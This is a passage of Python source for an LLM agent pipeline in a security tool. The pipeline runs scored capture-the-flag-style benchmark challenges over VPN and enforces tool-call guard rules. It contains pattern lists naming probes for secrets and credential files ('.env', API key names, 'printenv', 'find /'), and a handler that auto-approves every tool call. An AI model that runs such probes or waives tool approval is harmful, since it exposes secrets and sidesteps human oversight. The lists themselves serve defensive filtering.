"""四柱 Agent 管线：反思为主、迁跃为辅、分析为底、扩展为路。

管线流程:
  Phase 1 - 四柱思考（纯 LLM 调用，无工具，按序传递上下文）
    1. 分析者 ANALYST   → 深度分析 —— 为底
    2. 扩散者 DIFFUSER  → 路径探索 —— 为路
    3. 迁跃者 JUMPER    → 创造跨越 —— 为辅
    4. 反思者 REFLECTOR → 综合审视 + 制定执行计划 —— 为主

  Phase 2 - 执行循环（反思闭环，默认最多 20 轮，可通过 PIPELINE_MAX_ITERATIONS 配置）
    5. 决策者 DECISION_MAKER → 分解子任务
    6. 思考者 THINKER / 用户  → 选择子任务
    7. 执行者 RUNNER/READER/BUILDER → 使用隔离 runner 顺序/并行执行子任务
    8. 审计者 CHECKER    → 验证结果
    9. 反思者 REFLECTOR  → 审视结果，决定循环继续或结束
"""

from __future__ import annotations

import concurrent.futures
from collections.abc import Callable
from datetime import datetime
import hashlib
import json
from pathlib import Path
import re as _re_mod
import socket as socket_mod
import subprocess
import tempfile
import threading
import time as time_mod
from typing import TYPE_CHECKING, Any
from urllib.parse import parse_qsl as _parse_qsl
from urllib.parse import quote as _url_quote
from urllib.parse import urlencode as _urlencode
from urllib.parse import urljoin as _urljoin
from urllib.parse import urlparse as _urlparse
from urllib.parse import urlunparse as _urlunparse

from langchain_core.messages import AIMessage, HumanMessage, SystemMessage

from ..execution_control import ExecutionController, ExecutionInterruptedError
from ..model_client import build_llm_with_proxy_fallback
from .events import AgentEventType
from .roles import AgentRole, get_role_label, get_role_prompt

if TYPE_CHECKING:
    from .runner import AgentRunner

# ── 超时与熔断常量 ──
BASE_SUBTASK_TIMEOUT = 300           # 子任务基础超时（秒），复杂分析需 5 分钟以上
TIMEOUT_ESCALATION_STEP = 60         # 每次超时叠加步长（秒）
MAX_TIMEOUT_ESCALATIONS = 3          # 最多叠加次数 → 最大 300+3×60=480s
BENCHMARK_SUBTASK_TIMEOUT = 90       # Benchmark aggressive 单题/单子任务止损更激进
BENCHMARK_TIMEOUT_ESCALATIONS = 0    # Benchmark 不对同一子任务叠加重试，避免卡题
LLM_CALL_TIMEOUT_SECONDS = 120       # 单次角色 LLM 调用超时（秒）
CIRCUIT_BREAKER_CONSECUTIVE_FAILS = 2  # 连续失败 N 次触发熔断
BENCHMARK_REDUNDANT_BLOCK_LIMIT = 1    # finished 后首次被 guard 拦截即硬停
BENCHMARK_LOW_VALUE_SIGNAL_LIMIT = 4   # 单轮低价值探测过多时强制换题
BENCHMARK_SETUP_TIMEOUT_STREAK_LIMIT = 3  # 未锁定题目前连续超时，判定平台/网络前置异常
BENCHMARK_MAX_ITERATION_BATCHES = 20   # 每批达到轮数上限后，未达目标则自动再跑一批
BENCHMARK_RUSH_REMAINING_THRESHOLD = 1400  # 接近目标时进入只抢提交的冲刺模式


class PipelineCircuitBreakerError(RuntimeError):
    """连续子任务失败触发的熔断异常。"""


LOCAL_PROJECT_PROBE_PATTERNS = (
    "/cyber-agent-cli",
    "/home/my/cyber/claude.md",
    ".cyber-agent-cli",
    ".cyber-agent-cli-sessions",
    ".cyber-agent-cli-capabilities",
    ".cyber-agent-cli-history",
    ".cyber-agent-cli.json",
    ".cyber/sessions",
    ".cyber/",
    ".claude/",
    ".claude/settings",
    "claude.md",
    "webhook-routes.json",
    "/desktop/",
    "/src/cyber_agent/",
    "/tests/",
)
LOCAL_SECRET_PROBE_PATTERNS = (
    ".env",
    "opencode_api_key",
    "anthropic_auth_token",
    "gateway_api_key",
)
BROAD_LOCAL_SEARCH_PATTERNS = (
    "find /home",
    "find / ",
    "grep -r",
    "grep -rn",
    "cat /home",
)
LOCAL_ENV_PROBE_PATTERNS = (
    "env |",
    "env|",
    "printenv",
    "set |",
    "set|",
)
CYBER_AGENT_TASK_KEYWORDS = (
    "cyber-agent",
    "cyber_agent",
    "agent runner",
    "fourpillarpipeline",
    "四柱",
    "上下文压缩",
)
CYBER_AGENT_DEBUG_INTENT_KEYWORDS = (
    "调试",
    "排查",
    "修复",
    "修改",
    "实现",
    "开发",
    "测试",
    "debug",
    "fix",
    "bug",
    "review",
)


class FourPillarPipeline:
    """四柱管线协调器。所有 10 个角色各司其职。"""

    def __init__(
        self,
        *,
        runner: AgentRunner,
        runtime_context: dict[str, object],
        renderer: Any,
        event_handler: Callable[[str, object], None] | None = None,
    ) -> None:
        self._runner = runner
        self._runtime_context = runtime_context
        self._renderer = renderer
        self._event_handler = event_handler
        self._llm: Any = None

        # 累计 token（供 renderer 读取）
        self.cumulative_input_tokens = 0
        self.cumulative_output_tokens = 0

        # 熔断器状态
        self._consecutive_failures = 0

        # 执行轨迹
        self._trace: list[dict] = []
        self._session_id: str = ""
        self._trace_id: str = ""
        self._final_summary: str = ""
        self._trace_lock = threading.RLock()
        self._usage_lock = threading.RLock()
        self._benchmark_profile_active = False
        self._benchmark_current_challenge: str | None = None
        self._benchmark_stale_rounds = 0
        self._benchmark_forced_directive = ""
        self._benchmark_redundant_block_count = 0
        self._benchmark_hard_stop_recorded = False
        self._benchmark_state_lock = threading.RLock()
        self._benchmark_state: dict[str, Any] = self._new_benchmark_state()

    @staticmethod
    def _new_benchmark_state() -> dict[str, Any]:
        return {
            "vpn_connected": False,
            "tun_interface": None,
            "tun_ip": None,
            "vpn_config": None,
            "api_interface": None,
            "task_finished": False,
            "current_challenge": None,
            "active_containers": {},
            "last_challenges_snapshot": None,
            "completed_challenges": set(),
            "completed_scores": {},
            "closed_challenges": set(),
            "abandoned_challenges": set(),
            "recovery_attempted_challenges": set(),
            "reasoning_challenges": set(),
            "service_fingerprints": {},
            "probe_unreachable_streaks": {},
            "auto_submitted_flags": set(),
            "last_score": None,
            "redundant_block_count": 0,
            "setup_timeout_streak": 0,
            "background_processes_cleaned": False,
        }

    # ── LLM 管理 ──
    def _get_llm(self) -> Any:
        """懒加载用于角色思考的 LLM（无工具绑定，纯文本调用）。
        自动检测 API 格式使用对应客户端。"""
        if self._llm is not None:
            return self._llm

        from .._lazy_imports import load_llm_for_api
        from ..config import settings

        service_name = str(self._runtime_context.get("service_name", "deepseek"))
        api_key = str(self._runtime_context.get("api_key", ""))
        base_url = str(self._runtime_context.get("base_url", "")) if self._runtime_context.get("base_url") is not None else None
        if not base_url:
            base_url = settings.resolve_base_url(service_name)

        # 角色思考用子模型降低成本
        model_name = settings.subagent_model.replace("[1m]", "").strip()

        llm_cls, is_anthropic = load_llm_for_api(base_url)

        kwargs = settings.get_chat_openai_kwargs(
            service_name,
            model_name=model_name,
            api_key=api_key,
            base_url=base_url,
        )

        if is_anthropic:
            # ChatAnthropic 不支持 extra_body / openai_api_key
            kwargs.pop("extra_body", None)
            kwargs.pop("openai_api_key", None)
            kwargs.pop("openai_proxy", None)
            kwargs["anthropic_api_key"] = kwargs.pop("api_key", "")
            # 在 extra_body 被移除后不再设置 thinking
        else:
            # OpenAI 兼容端点：禁用 thinking，角色不需要深度推理
            if "extra_body" in kwargs and isinstance(kwargs["extra_body"], dict):
                kwargs["extra_body"]["thinking"] = {"type": "disabled"}

        import warnings
        with warnings.catch_warnings():
            warnings.filterwarnings("ignore", message=".*extra_body.*")
            self._llm = build_llm_with_proxy_fallback(llm_cls, kwargs)
        return self._llm

    def _call_role(
        self,
        role: AgentRole,
        user_input: str,
        *,
        context: str = "",
        extra_instruction: str = "",
    ) -> str:
        """调用单个角色 LLM，返回纯文本输出。思考角色无工具绑定。"""
        label = get_role_label(role)
        system_prompt = get_role_prompt(role)
        system_context = self._build_system_context()
        execution_guidance = self._build_execution_profile_guidance()

        full_system = f"""{system_prompt}

## 系统环境
{system_context}

## 执行姿态
{execution_guidance}"""

        user_content = f"## 用户任务\n{user_input}"
        if context:
            user_content += f"\n\n## 前序角色输出（请基于此继续）\n{context}"
        if extra_instruction:
            user_content += f"\n\n{extra_instruction}"

        try:
            response = self._get_llm().invoke([
                SystemMessage(content=full_system),
                HumanMessage(content=user_content),
            ])
            self._track_llm_usage(response)
            return self._extract_text(response)
        except Exception as exc:
            from ..logging import log_error
            log_error("pipeline", f"{label} 调用失败：{exc}")
            return f"[{label} 调用失败: {exc}]"

    # ── 执行轨迹 ──
    def _record_trace(
        self,
        event: str,
        *,
        detail: str = "",
        metadata: dict | None = None,
    ) -> None:
        """记录一条执行轨迹事件。"""
        trace_event = {
            "event": event,
            "timestamp": datetime.now().isoformat(),
            "detail": detail,
            "metadata": metadata or {},
        }
        with self._trace_lock:
            self._trace.append(trace_event)
        self._append_session_event(f"pipeline.{event}", trace_event)
        if self._event_handler is not None:
            try:
                self._event_handler(f"pipeline.{event}", trace_event)
            except Exception as exc:
                from ..logging import log_warning
                log_warning("pipeline", f"转发管线事件失败：{exc}")

    def _record_role_progress(
        self,
        role_key: str,
        label: str,
        status: str,
        *,
        action: str = "",
        detail: str = "",
        elapsed_ms: float | None = None,
        phase: str = "",
    ) -> None:
        metadata: dict[str, object] = {
            "role": role_key,
            "label": label,
            "status": status,
            "action": action,
            "phase": phase,
        }
        if elapsed_ms is not None:
            metadata["elapsed_ms"] = round(elapsed_ms)
        self._record_trace(
            "role_progress",
            detail=detail,
            metadata=metadata,
        )

    def _append_session_event(self, event: str, payload: object) -> None:
        """把管线事件同步写入当前会话事件流。"""
        session_id = str(self._runtime_context.get("session_id") or "").strip()
        if not session_id:
            return
        try:
            from ..session_store import append_session_event

            raw_base_dir = self._runtime_context.get("session_base_dir")
            base_dir = Path(str(raw_base_dir)).expanduser() if raw_base_dir else None
            event_path = append_session_event(
                session_id,
                event,
                payload=payload,
                base_dir=base_dir,
            )
            self._runtime_context["session_event_log"] = event_path
        except Exception as exc:
            from ..logging import log_error
            log_error("trace", f"保存管线事件失败：{exc}")

    def _persist_main_session(self) -> None:
        """管线内直接保存主 runner 历史，避免长任务结束前 session 不可见。"""
        session_id = str(self._runtime_context.get("session_id") or "").strip()
        if not session_id:
            return
        try:
            from ..session_store import save_session_history

            approval_policy = self._runtime_context.get("approval_policy", "prompt")
            approval_value = getattr(approval_policy, "value", str(approval_policy))
            raw_base_dir = self._runtime_context.get("session_base_dir")
            base_dir = Path(str(raw_base_dir)).expanduser() if raw_base_dir else None
            session_path = save_session_history(
                session_id,
                self._runner.get_history_snapshot(),
                mode=getattr(getattr(self._runner, "mode", None), "value", "standard"),
                approval_policy=approval_value,
                source_session_id=self._runtime_context.get("session_source_id"),
                recent_inputs=self._runtime_context.get("_recent_inputs"),
                base_dir=base_dir,
            )
            self._runtime_context["session_storage_dir"] = session_path.parent
        except Exception as exc:
            from ..logging import log_error
            log_error("trace", f"保存管线主会话失败：{exc}")

    def _append_pipeline_user_message(self, user_input: str) -> None:
        """四柱管线不走 AgentRunner.run，需要主动把用户输入纳入主 history。"""
        message = HumanMessage(
            content=user_input,
            additional_kwargs={"cyber_agent_pipeline": True},
        )
        self._runner.history.append(message)
        self._append_session_event(
            "history_updated",
            {
                "reason": "pipeline_human_message",
                "message_type": message.type,
                "message_count": len(self._runner.history),
                "turn_count": self._runner.get_turn_count(),
            },
        )
        self._persist_main_session()

    def _append_pipeline_summary_message(self) -> None:
        """把完整四柱总结写回主会话，供 /history 和后续对话使用。"""
        summary = self._final_summary.strip()
        if not summary:
            return
        message = AIMessage(
            content=summary,
            additional_kwargs={"cyber_agent_pipeline_summary": True},
        )
        self._runner.history.append(message)
        self._append_session_event(
            "history_updated",
            {
                "reason": "pipeline_summary_message",
                "message_type": message.type,
                "message_count": len(self._runner.history),
                "turn_count": self._runner.get_turn_count(),
            },
        )
        self._persist_main_session()

    @staticmethod
    def _build_execution_summary(
        all_results: list[list[str]],
        iteration: int,
    ) -> str:
        """构建完整的四柱执行总结，不截断子任务正文。"""
        total_tasks = sum(len(round_) for round_ in all_results)
        success_count = 0
        fail_count = 0
        for round_ in all_results:
            for r in round_:
                body = r.split("\n", 1)[1] if "\n" in r else r
                is_fail = body.startswith("❌ 失败:") or "❌ 全部超时叠加后重规划也失败" in body[:60]
                if is_fail:
                    fail_count += 1
                else:
                    success_count += 1

        summary_parts = [
            "## 📊 四柱管线执行总结\n",
            f"共执行 {total_tasks} 个子任务，经过 {iteration} 轮迭代。"
            f" ✅ 成功 {success_count} | ❌ 失败 {fail_count}",
        ]

        for iter_idx, round_ in enumerate(all_results, 1):
            summary_parts.append(
                f"\n### 第 {iter_idx} 轮迭代 ({len(round_)} 个子任务)"
            )
            for r in round_:
                lines = r.split("\n", 1)
                heading = lines[0].lstrip("# ")
                body = lines[1] if len(lines) > 1 else ""
                is_fail = body.startswith("❌ 失败:") or "❌ 全部超时叠加后重规划也失败" in body[:60]
                prefix = "❌" if is_fail else "✅"
                summary_parts.append(f"- {prefix} {heading}")
                if body.strip():
                    summary_parts.append("")
                    summary_parts.append(body.strip())
                    summary_parts.append("")
        summary_parts.append("")
        return "\n".join(summary_parts)

    def _save_trace(self) -> None:
        """将执行轨迹保存到会话目录。"""
        if not self._trace:
            return
        try:
            storage_dir = Path.home() / ".cyber-agent-cli-traces"
            storage_dir.mkdir(parents=True, exist_ok=True)
            sid = self._trace_id or self._session_id or datetime.now().strftime("%Y%m%d_%H%M%S")
            trace_file = storage_dir / f"{sid}.trace.json"
            trace_file.write_text(
                json.dumps(self._trace, ensure_ascii=False, indent=2),
                encoding="utf-8",
            )
            self._append_session_event(
                "pipeline.trace_saved",
                {"trace_file": str(trace_file), "event_count": len(self._trace)},
            )
        except Exception as exc:
            from ..logging import log_error
            log_error("trace", f"保存执行轨迹失败：{exc}")

    def _benchmark_state_path(self) -> Path:
        """Return the checkpoint path for the current Benchmark run."""
        raw_base_dir = self._runtime_context.get("session_base_dir")
        if raw_base_dir:
            base_dir = Path(str(raw_base_dir)).expanduser()
        else:
            base_dir = Path.home() / ".cyber-agent-cli-benchmark"
        session_id = self._session_id or str(
            self._runtime_context.get("session_id") or "current"
        )
        safe_session_id = _re_mod.sub(r"[^A-Za-z0-9_.-]+", "_", session_id)
        return base_dir / ".benchmark-state" / f"{safe_session_id}.json"

    def _benchmark_shared_state_path(self) -> Path:
        """Return the cross-session Benchmark checkpoint path."""
        raw_base_dir = self._runtime_context.get("session_base_dir")
        if raw_base_dir:
            base_dir = Path(str(raw_base_dir)).expanduser()
        else:
            base_dir = Path.home() / ".cyber-agent-cli-benchmark"
        return base_dir / ".benchmark-state" / "shared.json"

    def _benchmark_task_identity(self) -> str | None:
        api_config = self._benchmark_api_config_from_workspace()
        if api_config is None:
            return None
        base_url, token = api_config
        workdir = Path("/home/my/cyber/benchmark_test")
        vpn_names = ",".join(sorted(path.name for path in workdir.glob("*.ovpn")))
        identity_input = f"{base_url}\n{token}\n{vpn_names}"
        return hashlib.sha256(identity_input.encode("utf-8")).hexdigest()

    def _merge_benchmark_persisted_state(self, persisted: dict[str, Any]) -> None:
        """Merge safe-to-reuse Benchmark state into the current run.

        Active containers and current challenge are intentionally not restored:
        they must be refreshed from the platform API for the current process.
        """
        if not persisted:
            return
        with self._benchmark_state_lock:
            for key in (
                "completed_challenges",
                "closed_challenges",
                "abandoned_challenges",
                "recovery_attempted_challenges",
                "auto_submitted_flags",
            ):
                merged = set(self._benchmark_state.get(key, set()))
                raw_value = persisted.get(key)
                if isinstance(raw_value, (list, set, tuple)):
                    merged.update(str(item) for item in raw_value if item)
                self._benchmark_state[key] = merged
            if isinstance(persisted.get("completed_scores"), dict):
                scores = dict(self._benchmark_state.get("completed_scores", {}))
                for code, score in persisted["completed_scores"].items():
                    if isinstance(code, str) and isinstance(score, int):
                        scores[code] = score
                self._benchmark_state["completed_scores"] = scores
            if isinstance(persisted.get("service_fingerprints"), dict):
                fingerprints = dict(
                    self._benchmark_state.get("service_fingerprints", {})
                )
                for code, fingerprint in persisted["service_fingerprints"].items():
                    if isinstance(code, str) and isinstance(fingerprint, str):
                        fingerprints[code] = fingerprint
                self._benchmark_state["service_fingerprints"] = fingerprints
            for key in ("api_interface", "tun_interface", "tun_ip", "vpn_config"):
                value = persisted.get(key)
                if value and not self._benchmark_state.get(key):
                    self._benchmark_state[key] = value
            if persisted.get("vpn_connected") is True:
                self._benchmark_state["vpn_connected"] = True

    def _load_benchmark_state(self) -> None:
        """Load shared Benchmark checkpoint so new sessions do not retread closed tasks."""
        if not self._is_benchmark_aggressive():
            return
        candidates: list[Path] = []
        current_identity = self._benchmark_task_identity()
        shared = self._benchmark_shared_state_path()
        if shared.exists():
            candidates.append(shared)
        state_dir = self._benchmark_state_path().parent
        if state_dir.exists():
            session_id = self._session_id or str(
                self._runtime_context.get("session_id") or ""
            )
            for path in sorted(
                state_dir.glob("*.json"),
                key=lambda item: item.stat().st_mtime,
                reverse=True,
            ):
                if path.name == "shared.json":
                    continue
                if session_id and path.stem == session_id:
                    continue
                candidates.append(path)
                break
        for path in candidates:
            try:
                data = json.loads(path.read_text(encoding="utf-8"))
                persisted_identity = (
                    data.get("task_identity") if isinstance(data, dict) else None
                )
                if not current_identity or persisted_identity != current_identity:
                    self._record_trace(
                        "benchmark_state_skipped",
                        detail=(
                            f"跳过 Benchmark 状态 {path}：任务身份不匹配或为旧格式。"
                        ),
                        metadata={
                            "path": str(path),
                            "has_current_identity": bool(current_identity),
                            "has_persisted_identity": bool(persisted_identity),
                        },
                    )
                    continue
                state = data.get("state") if isinstance(data, dict) else None
                if isinstance(state, dict):
                    self._merge_benchmark_persisted_state(state)
            except Exception as exc:
                from ..logging import log_error
                log_error("benchmark", f"加载 Benchmark 状态失败 {path}: {exc}")
        if candidates:
            self._record_trace(
                "benchmark_state_loaded",
                detail="已加载 Benchmark 跨会话状态: "
                + ", ".join(str(path) for path in candidates),
                metadata=self._benchmark_state_snapshot(),
            )

    def _persist_benchmark_state(self) -> None:
        """Persist a sanitized Benchmark checkpoint for summaries and recovery."""
        if not self._is_benchmark_aggressive():
            return
        try:
            path = self._benchmark_state_path()
            path.parent.mkdir(parents=True, exist_ok=True)
            payload = {
                "session_id": self._session_id
                or str(self._runtime_context.get("session_id") or ""),
                "updated_at": datetime.now().isoformat(),
                "task_identity": self._benchmark_task_identity(),
                "state": self._benchmark_state_snapshot(),
            }
            tmp_path = path.with_suffix(path.suffix + ".tmp")
            tmp_path.write_text(
                json.dumps(payload, ensure_ascii=False, indent=2),
                encoding="utf-8",
            )
            tmp_path.replace(path)
            shared_path = self._benchmark_shared_state_path()
            shared_path.parent.mkdir(parents=True, exist_ok=True)
            shared_payload = dict(payload)
            shared_payload["session_id"] = "shared"
            shared_tmp = shared_path.with_suffix(shared_path.suffix + ".tmp")
            shared_tmp.write_text(
                json.dumps(shared_payload, ensure_ascii=False, indent=2),
                encoding="utf-8",
            )
            shared_tmp.replace(shared_path)
            self._runtime_context["benchmark_state_file"] = str(path)
        except Exception as exc:
            from ..logging import log_error
            log_error("benchmark", f"保存 Benchmark 状态失败：{exc}")

    def _load_trace(self, session_id: str) -> list[dict] | None:
        """加载指定会话的执行轨迹。"""
        try:
            trace_file = Path.home() / ".cyber-agent-cli-traces" / f"{session_id}.trace.json"
            if not trace_file.exists():
                return None
            return json.loads(trace_file.read_text(encoding="utf-8"))
        except Exception:
            return None

    # ── 超时与熔断 ──
    def _check_circuit_breaker(self) -> None:
        """检查熔断器：连续失败超过阈值则抛出异常。"""
        if self._consecutive_failures >= CIRCUIT_BREAKER_CONSECUTIVE_FAILS:
            raise PipelineCircuitBreakerError(
                f"连续 {self._consecutive_failures} 个子任务失败，触发熔断保护。"
                f"请检查任务是否合理或简化需求后重试。"
            )

    def _auto_approval_handler(self, tool: Any, tool_call: dict) -> "ApprovalDecision":
        """管线自动批准工具调用，由子任务审批器负责额外边界约束。"""
        from .approval import ApprovalDecision
        return ApprovalDecision(True, "管线自动批准所有工具调用。")

    @staticmethod
    def _extract_tool_text(tool_call: dict) -> str:
        args = tool_call.get("args", {})
        if not isinstance(args, dict):
            return ""
        parts: list[str] = []
        for key in ("command", "path", "working_directory", "url"):
            value = args.get(key)
            if isinstance(value, str):
                parts.append(value)
        return "\n".join(parts)

    @staticmethod
    def _command_uses_interface(command: str) -> str | None:
        match = _re_mod.search(r"--interface(?:=|\s+)([^\s'\"\\]+)", command)
        return match.group(1) if match else None

    @staticmethod
    def _extract_unique_code(text: str) -> str | None:
        match = _re_mod.search(
            r"\bunique_code\b\s*[:=]\s*['\"]?([A-Za-z0-9][A-Za-z0-9_-]*)\b",
            text,
        )
        if match:
            return match.group(1)
        match = _re_mod.search(
            r"\bunique_code[\"'=:/\s]+([A-Za-z0-9][A-Za-z0-9_-]*)\b",
            text,
        )
        if match:
            return match.group(1)
        match = _re_mod.search(
            r"\b(?=[A-Za-z0-9-]*\d)[A-Za-z][A-Za-z0-9]*(?:-[A-Za-z0-9]+)+\b",
            text,
        )
        return match.group(0) if match else None

    def _benchmark_known_unique_codes(self) -> set[str]:
        codes: set[str] = set()
        with self._benchmark_state_lock:
            state = self._benchmark_state_snapshot_unlocked()
        for key in (
            "current_challenge",
        ):
            value = state.get(key)
            if isinstance(value, str) and value:
                codes.add(value)
        for key in (
            "completed_challenges",
            "closed_challenges",
            "abandoned_challenges",
            "recovery_attempted_challenges",
            "reasoning_challenges",
        ):
            values = state.get(key) or []
            if isinstance(values, (list, set, tuple)):
                codes.update(str(value) for value in values if value)
        active = state.get("active_containers") or {}
        if isinstance(active, dict):
            codes.update(str(code) for code in active if code)
        scores = state.get("completed_scores") or {}
        if isinstance(scores, dict):
            codes.update(str(code) for code in scores if code)
        snapshot = state.get("last_challenges_snapshot")
        if isinstance(snapshot, list):
            for item in snapshot:
                if not isinstance(item, dict):
                    continue
                code = item.get("unique_code")
                if isinstance(code, str) and code:
                    codes.add(code)
        elif isinstance(snapshot, dict):
            for key in ("completed_challenges", "active_challenges"):
                values = snapshot.get(key) or []
                if isinstance(values, (list, set, tuple)):
                    codes.update(str(value) for value in values if value)
        return codes

    def _benchmark_extract_unique_codes(self, text: str) -> list[str]:
        if not text:
            return []
        lowered = text.lower()
        found: list[str] = []
        explicit = self._extract_unique_code(text)
        if explicit:
            found.append(explicit)
        for code in sorted(self._benchmark_known_unique_codes(), key=len, reverse=True):
            if code and code.lower() in lowered:
                found.append(code)
        challenge_code_pattern = r"\b(?=[A-Za-z0-9-]*\d)[A-Za-z][A-Za-z0-9]*(?:-[A-Za-z0-9]+)+\b"
        for match in _re_mod.findall(challenge_code_pattern, text):
            found.append(match)
        return list(dict.fromkeys(found))

    def _benchmark_extract_unique_code(self, text: str) -> str | None:
        codes = self._benchmark_extract_unique_codes(text)
        return codes[0] if codes else None

    def _benchmark_tool_guard(self, tool_call: dict) -> str | None:
        """Block Benchmark actions that are known to waste time or corrupt state."""
        if not self._is_benchmark_aggressive():
            return None

        tool_name = str(tool_call.get("name", ""))
        if tool_name not in {"run_shell_command", "fetch_web_page"}:
            return None

        command = self._extract_tool_text(tool_call)
        lowered = command.lower()
        if not command:
            return None

        with self._benchmark_state_lock:
            state = dict(self._benchmark_state)
            completed = set(self._benchmark_state.get("completed_challenges", set()))
            closed = set(self._benchmark_state.get("closed_challenges", set()))
            abandoned = set(self._benchmark_state.get("abandoned_challenges", set()))
            reasoning = set(self._benchmark_state.get("reasoning_challenges", set()))
            active = dict(self._benchmark_state.get("active_containers", {}))

        if "/home/study" in lowered:
            return (
                "Benchmark aggressive 当前工作目录固定为 "
                "/home/my/cyber/benchmark_test，禁止切换或探测 /home/study。"
            )

        if state.get("task_finished") and (
            "tsecbench.zc.tencent.com" in lowered
            or "/openapi/v1/challenges" in lowered
            or "10.0." in lowered
            or "auto_solve.sh" in lowered
        ):
            return "Benchmark 任务已返回 invalid_state/finished，禁止继续调用平台或靶场容器。"

        if "auto_solve.sh" in lowered and (
            _re_mod.search(r"\b(?:bash|sh)\s+\.?/?.*auto_solve\.sh\b", lowered)
            or "nohup" in lowered
            or "&" in command
        ):
            return (
                "Benchmark Hub 持有唯一 runner 和状态队列，禁止在子任务中启动 "
                "auto_solve.sh 后台跑分脚本，避免与 Hub 抢题、重复 start/submit。"
            )

        if "openvpn" in lowered and ("--config" in lowered or ".ovpn" in lowered):
            if state.get("vpn_connected"):
                tun = state.get("tun_interface") or "tun0"
                ip = state.get("tun_ip") or "已分配 IP"
                return (
                    f"VPN 已连接（{tun} {ip}），禁止重复启动 OpenVPN；"
                    "直接复用现有 VPN 状态继续解题。"
                )

        is_platform_api = (
            "tsecbench.zc.tencent.com" in lowered
            or "/openapi/v1/challenges" in lowered
        )
        used_interface = self._command_uses_interface(command)
        has_container_url = bool(
            _re_mod.search(r"https?://10\.\d{1,3}\.\d{1,3}\.\d{1,3}", command)
        )
        if has_container_url and not is_platform_api:
            tun_interface = str(state.get("tun_interface") or "tun0")
            if tool_name == "fetch_web_page":
                return (
                    f"Benchmark 容器地址 10.x 必须通过 VPN/{tun_interface} 访问；"
                    f"fetch_web_page 无法绑定出口，请改用 curl --interface {tun_interface}。"
                )
            if used_interface and used_interface != tun_interface:
                return (
                    "Benchmark 容器地址 10.x 禁止走物理网卡；"
                    f"请改用 --interface {tun_interface} 访问靶场容器。"
                )
        if is_platform_api:
            if "/challenges/hint" in lowered:
                return (
                    "Benchmark aggressive 禁止调用 hint API：hint 会扣分。"
                    "先用无成本指纹、源码泄漏、默认凭证、常见漏洞路径拿分；"
                    "除非用户明确临场要求使用 hint，否则不要调用。"
                )
            if used_interface and _re_mod.fullmatch(r"tun\d+", used_interface):
                api_interface = state.get("api_interface") or "物理网卡"
                return (
                    f"平台 API 禁止走 {used_interface}；VPN/tun 只用于访问 10.x 容器。"
                    f"请改用 --interface {api_interface} 并携带 BENCHMARK_TOKEN。"
                )
            if state.get("api_interface") and used_interface is None:
                return (
                    "已确认平台 API 需要显式绑定出口，禁止不带 --interface 调用平台 API；"
                    f"请使用 --interface {state['api_interface']}。"
                )
            if "authorization:" in lowered and "benchmark_token:" not in lowered:
                return (
                    "TSec Benchmark 平台认证头必须是 BENCHMARK_TOKEN，"
                    "不要使用 Authorization: Bearer。"
                )
            if "x-benchmark-token:" in lowered:
                return (
                    "TSec Benchmark 平台认证头必须精确使用 BENCHMARK_TOKEN，"
                    "不要使用 X-Benchmark-Token。"
                )
            if "/challenges/submit" in lowered and "challenge_id" in lowered:
                return (
                    "提交接口请求体字段必须使用 unique_code，"
                    "不要使用 challenge_id。"
                )

            if "/challenges/start" in lowered:
                code = self._benchmark_extract_unique_code(command)
                if lowered.count("/challenges/start") > 1:
                    return (
                        "Benchmark 禁止在同一条命令中批量 start 多题；"
                        "必须按 start -> probe/submit -> close 的单题顺序执行。"
                    )
                active_open = {
                    active_code for active_code in active
                    if active_code not in completed
                    and active_code not in closed
                    and active_code not in abandoned
                }
                if active_open:
                    current_active = ", ".join(sorted(active_open))
                    return (
                        f"当前已有 active 容器 {current_active}，禁止继续 start；"
                        "必须先 probe/submit/close 当前题释放名额。"
                    )
                start_path_token = command.split("/challenges/start", 1)[-1].split()[0]
                if (
                    "?" not in start_path_token
                    and ("unique_code" in lowered or code)
                ):
                    return (
                        "start 接口的 unique_code 必须放在 query 参数中："
                        f"/openapi/v1/challenges/start?unique_code={code or '<selected_code>'}；"
                        "不要用 JSON body 或 form body 传 unique_code。"
                    )
                snapshot = state.get("last_challenges_snapshot")
                target_item = None
                if isinstance(snapshot, list) and code:
                    target_item = next(
                        (
                            item for item in snapshot
                            if isinstance(item, dict) and item.get("unique_code") == code
                        ),
                        None,
                    )
                target_is_recoverable = (
                    isinstance(target_item, dict)
                    and target_item.get("is_completed") is not True
                    and self._benchmark_is_startable_status(target_item)
                )
                if code in completed:
                    return f"{code} 已确认通关，禁止重复 start。"
                if (code in closed or code in abandoned) and not target_is_recoverable:
                    return f"{code} 已在本轮放弃/关闭，禁止回头重复 start；请选择下一道未完成题。"
                if isinstance(snapshot, list) and code:
                    target_difficulty = str(
                        (target_item or {}).get("difficulty") or ""
                    ).lower()
                    target_rank = self._benchmark_difficulty_rank(target_difficulty)
                    better_candidates = [
                        item for item in snapshot
                        if isinstance(item, dict)
                        and isinstance(item.get("unique_code"), str)
                        and item.get("unique_code") not in completed
                        and item.get("is_completed") is not True
                        and (
                            self._benchmark_is_startable_status(item)
                            or self._benchmark_is_active_status(item)
                        )
                        and self._benchmark_difficulty_rank(item.get("difficulty")) < target_rank
                    ]
                    if better_candidates:
                        best = sorted(better_candidates, key=self._benchmark_candidate_rank)[0]
                        best_code = best.get("unique_code")
                        best_difficulty = str(best.get("difficulty") or "unknown").lower()
                        return (
                            f"仍存在更高优先级未完成候选 {best_code} ({best_difficulty})，"
                            f"禁止抢跑 start {code} ({target_difficulty})；"
                            "请先按 selection_policy 选择未完成 stopped 题。"
                        )
            if "/challenges/close" in lowered:
                code = self._benchmark_extract_unique_code(command)
                close_path_token = command.split("/challenges/close", 1)[-1].split()[0]
                if (
                    "?" not in close_path_token
                    and ("unique_code" in lowered or code)
                ):
                    return (
                        "close 接口的 unique_code 必须放在 query 参数中："
                        f"/openapi/v1/challenges/close?unique_code={code or '<selected_code>'}；"
                        "不要用 JSON body 或 form body 传 unique_code。"
                    )
                if code in closed:
                    return f"{code} 已确认关闭，禁止重复 close；请刷新列表并切换下一道未完成题。"
                if code in reasoning and code not in completed and code not in abandoned:
                    return (
                        f"{code} 已有 fast path 可达响应/API/框架线索，禁止作为无进展题 close；"
                        "必须继续围绕该线索深挖、尝试登录/API/源码/默认凭证/配置泄漏，"
                        "只有提交成功、明确低价值或用户要求放弃后才能 close。"
                    )
                current = state.get("current_challenge")
                snapshot = state.get("last_challenges_snapshot")
                if (
                    code
                    and code not in completed
                    and code not in abandoned
                    and code != current
                    and code not in active
                    and isinstance(snapshot, list)
                ):
                    target_item = next(
                        (
                            item for item in snapshot
                            if isinstance(item, dict) and item.get("unique_code") == code
                        ),
                        None,
                    )
                    if (
                        isinstance(target_item, dict)
                        and target_item.get("is_completed") is not True
